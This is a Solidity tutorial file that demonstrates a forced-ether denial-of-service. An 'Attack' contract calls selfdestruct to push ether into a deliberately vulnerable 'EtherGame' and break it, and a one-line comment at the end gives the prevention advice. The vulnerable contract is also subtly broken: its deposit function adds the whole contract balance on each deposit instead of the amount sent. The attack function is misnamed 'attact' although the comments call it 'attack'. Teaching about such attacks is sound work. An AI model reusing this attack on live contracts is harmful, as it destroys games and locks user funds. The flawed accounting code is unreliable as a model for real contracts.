// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.24;

//The goal of this game is to be the 7t player to deposit 1 ether.
//Players can deposit only 1 ether ata atime.
// Winners will be able to withdraw all ether

/**
 * deploy ethergame
 * players (say Alice and bob) decides to play, deposits 1 ether each.
 * deploy attack with address of ethergame
 * Call attack.attack sending 5 ether This will break the game
 * no one can become the winner.
 *
 *
 *
 * What happened?
 * attack forced the balance of EtherGame to equal 7 ether.
 * now no one can deposit and the winner cannot be set.
 *
 */
contract EtherGame {
    uint256 public targetAmount = 7 ether;
    address public winner;
    uint256 balance;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 ether");
        balance += address(this).balance; // +msg.value
        require(targetAmount >= balance, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        (bool sent,) = msg.sender.call{value: address(this).balance}(""); // Use value: balance
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame ethergame;

    constructor(EtherGame _EtherGAME) {
        ethergame = EtherGame(_EtherGAME);
    }

    function attact() public payable {
        //You can simply break the game by sending ether so that
        // the game balance >=7 ether
        address payable addr = payable(address(ethergame));
        selfdestruct(addr);
    }
}

//Preventative Techniques

// Dont relay on address(this).balance
